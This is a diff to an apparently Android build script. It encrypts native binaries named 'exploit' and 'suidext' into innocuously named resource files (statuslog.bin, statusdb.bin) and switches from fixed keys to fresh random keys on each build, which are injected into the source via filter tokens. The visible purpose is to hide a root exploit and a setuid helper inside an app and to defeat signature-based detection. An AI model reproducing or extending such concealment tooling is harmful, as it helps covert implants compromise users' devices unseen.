@@ -56,23 +56,19 @@
 	</filterset>
 
 	<target name="salt" unless="randomSalt">
-		<random len="8" property="randomSalt">
-		</random>
+		<random len="8" property="randomSalt"/>
 		<echo>RandomSalt:${randomSalt}</echo>
-	</target>
-
-	<target name="key">
-		<random len="8" property="randomKey">
-		</random>
-		<echo>RandomKey:${randomKey}</echo>
+		
+		<random len="8" property="randomKeyMessages"/>
+		<random len="8" property="randomKeyStatusDb"/>
+		<random len="8" property="randomKeyStatusLog"/>
 	</target>
 
 	<target name="encrypt-messages" depends="salt">
 		<delete file="res/raw/messages.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyMessages}" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
 		<delete file="res/raw/statusdb.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
-
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
 	</target>
 
 	<target name="encrypt-manifest" depends="salt">
@@ -84,7 +80,7 @@
 
 	<target name="encrypt-exploit" depends="salt">
 		<delete file="res/raw/statuslog.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusLog}" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
 	</target>
 
 	<target name="encrypt-noexploit">
@@ -193,6 +189,11 @@
 					<filter token="RANDOM" value="${randomSalt}" />
 					<filter token="OSVERSION" value="@{osversion}" />
 					<filter token="VERSION" value="${version}" />
+					
+					<filter token="RNDLOG" value="${randomKeyStatusLog}" />
+					<filter token="RNDDB" value="${randomKeyStatusDb}" />
+					<filter token="RNDMSG" value="${randomKeyMessages}" />
+					
 				</filterset>
 			</copy>
 
